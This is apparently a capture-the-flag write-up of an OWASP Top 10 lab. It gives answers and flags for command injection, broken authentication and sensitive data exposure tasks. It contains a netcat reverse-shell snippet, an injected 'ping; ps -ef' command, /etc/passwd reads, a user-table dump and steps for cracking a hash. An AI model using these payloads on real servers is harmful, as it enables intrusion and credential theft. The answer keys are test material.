# OWASP Top 10 Module

## Command Injection Practial

Command Injection occurs when server-side code (like PHP) in a web application makes a system call on the hosting machine.  It is a web vulnerability that allows an attacker to take advantage of that made system call to execute operating system commands on the server.  Sometimes this won't always end in something malicious, like a `whoami` or just reading of files.  That isn't too bad.  But the thing about command injection is it opens up many options for the attacker.  The worst thing they could do would be to spawn a reverse shell to become the user that the web server is running as.  A simple `;nc -e /bin/bash` is all that's needed and they own your server; some variants of netcat don't support the -e option. You can use a list of these reverse shells as an alternative. 

What strange text file is in the website root directory? **drpepper.txt**
> **Explain:** Using the `ls -a` command you will get a list of all files in current directory (you can check path of current directory by using `pwd` command)

How many non-root/non-service/non-daemon users are there? **0**
> **Explain:** run the `ping -c 1 10.x.x.x; ps -ef` command

What user is this app running as? **www-data**
> **Explain:** run the `whoami` command

What is the user's shell set as? **/usr/sbin/nlogin**
> **Explain:** this information can be located in the /etc/passwd file using the command `cat /etc/passwd | grep www-data`

What version of Ubuntu is running? **18.04.4**
> **Explain:** run the command `lsb_release -a`

Print out the MOTD (message of the day.  What favorite beverage is shown?
> **Explain:** The /etc/motd is a file on Unix-like systems that contains a “message of the day”, used to send a common message to all users in a more efficient manner than sending them all an e-mail message. To locate a specific MOTD file and to read its content we run the command `cat /etc/update-motd.d/00-header` command. The 00-header you will get from the hint of the question.

## Broken Authentication Practical

Authentication and session management constitute core components of modern web applications. Authentication allows users to gain access to web applications by verifying their identities. The most common form of authentication is using a username and password mechanism. A user would enter these credentials, the server would verify them. If they are correct, the server would then provide the users’ browser with a session cookie. A session cookie is needed because web servers use HTTP(S) to communicate which is stateless. Attaching session cookies means that the server will know who is sending what data. The server can then keep track of users' actions. 

What is the flag that you found in darren's account? **fe86079416a21a3c99937fea8874b667**

Now try to do the same trick and see if you can login as arthur. What is the flag that you found in arthur's account? **d9ac0f7db4fda460ac3edeb75d75e16e**

## Sensitive Data Exposure

When a webapp accidentally divulges sensitive data, we refer to it as "Sensitive Data Exposure". This is often data directly linked to customers (e.g. names, dates-of-birth, financial information, etc), but could also be more technical information, such as usernames and passwords. At more complex levels this often involves techniques such as a "Man in The Middle Attack", whereby the attacker would force user connections through a device which they control, then take advantage of weak encryption on any transmitted data to gain access to the intercepted information (if the data is even encrypted in the first place...). Of course, many examples are much simpler, and vulnerabilities can be found in web apps which can be exploited without any advanced networking knowledge. Indeed, in some cases, the sensitive data can be found directly on the webserver itself...

What is the name of the mentioned directory? **/assets**
> **Explain:** inspecting the login page, there is a comment telling us where the database is stored

Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data? **webapp.db**
> **Explain:** go to the `/assets` directory and you'll see the database at the bottom

Use the supporting material to access the sensitive data. What is the password hash of the admin user? **6eea9b7ef19179a06954edd0f6c05ceb**
> **Explained:** check the tipe of database file it is `file webapp.db` then use the following command to access the database `sqlite3 webapp.db`

```console
└─$ sqlite3 webapp.db                                                                                                                                                                                                                    1 ⚙
SQLite version 3.40.0 2022-11-16 12:10:08
Enter ".help" for usage hints.
sqlite> .tables
sessions  users   
sqlite> PRAGMA table_info(users);
0|userID|TEXT|1||1
1|username|TEXT|1||0
2|password|TEXT|1||0
3|admin|INT|1||0
sqlite> SELECT * FROM users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
```

Crack the hash. What is the admin's plaintext password? **qwertyuiop**
> **Explain:** using the website [crackstation](https://crackstation.net/) you will be able to crach the md5 hash

Login as the admin. What is the flag? **THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}**

## XML External Entity

An XML External Entity (XXE) attack is a vulnerability that abuses features of XML parsers/data. It often allows an attacker to interact with any backend or external systems that the application itself can access and can allow the attacker to read the file on that system. They can also cause Denial of Service (DoS) attack or could use XXE to perform Server-Side Request Forgery (SSRF) inducing the web application to make requests to other applications. XXE may even enable port scanning and lead to remote code execution.

